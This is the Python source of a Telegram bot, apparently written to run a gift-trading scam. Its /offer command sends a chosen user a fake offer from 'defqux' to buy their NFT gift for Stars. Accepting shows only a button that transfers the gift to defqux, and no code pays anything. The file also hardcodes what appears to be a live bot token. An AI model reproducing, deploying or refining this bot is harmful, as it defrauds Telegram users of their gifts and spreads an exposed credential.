import asyncio
import asyncio
import logging
import re
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.enums import ParseMode
from aiogram.filters import Command

BOT_TOKEN = "8850115069:AAHt8yX4-4gswis3VY4mmO2zj_ipBjkK2s4"
BUYER = "defqux"
ADMIN_ID = 8548929333
DEFAULT_STARS = 7000

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


def parse_gift(text: str):
    m = re.search(r't\.me/nft/([A-Za-z0-9]+)-(\d+)', text)
    if not m:
        return None
    name, num = m.group(1), m.group(2)
    gift_name = re.sub(r'([a-z])([A-Z])', r'\1 \2', name)
    stars = DEFAULT_STARS
    for match in re.finditer(r'\b(\d{3,7})\b', text):
        val = int(match.group(1))
        if str(val) != num and 100 <= val <= 1000000:
            stars = val
            break
    return {
        "gift_name": f"{gift_name} #{num}",
        "link": f"https://t.me/nft/{name}-{num}",
        "stars": stars
    }


@dp.message(Command("start"))
async def start(message: Message):
    await message.answer("Бот работает")


@dp.message(Command("offer"))
async def cmd_offer(message: Message):
    print(f"OFFER from {message.from_user.id}: {message.text}", flush=True)
    if message.from_user.id != ADMIN_ID:
        await message.answer("Нет прав")
        return
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await message.answer("Формат: /offer <chat_id> https://t.me/nft/... 5000")
            return
        m = re.match(r'(\d+)\s+(.+)', args[1])
        if not m:
            await message.answer("Неверный формат")
            return
        chat_id = int(m.group(1))
        gift = parse_gift(m.group(2))
        if not gift:
            await message.answer("Не нашёл ссылку")
            return
        text = (
            f"<a href=\"{gift['link']}\">{gift['gift_name']}</a>\n\n"
            f"<b>Пользователь {BUYER} предлагает Вам {gift['stars']} Stars за подарок.</b>"
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="✗ Отклонить", callback_data="dec"),
            InlineKeyboardButton(text="✓ Принять", callback_data=f"acc|{gift['stars']}")
        ]])
        await bot.send_message(chat_id, text, reply_markup=kb, parse_mode=ParseMode.HTML)
        await message.answer(f"Отправлено в {chat_id}")
    except Exception as e:
        print(f"ERROR: {e}", flush=True)
        await message.answer(f"Ошибка: {e}")


@dp.callback_query(F.data == "dec")
async def on_dec(cb: CallbackQuery):
    await cb.answer("Отклонено", show_alert=True)
    await cb.message.edit_text("Предложение отклонено.", reply_markup=None)


@dp.callback_query(F.data.startswith("acc|"))
async def on_acc(cb: CallbackQuery):
    await cb.answer("Принято", show_alert=True)
    await cb.message.edit_text(
        "Предложение принято.\n\nПередайте подарок.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="Передать", url="tg://send_gift?to=defqux")
        ]])
    )


async def main():
    print("Bot started", flush=True)
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
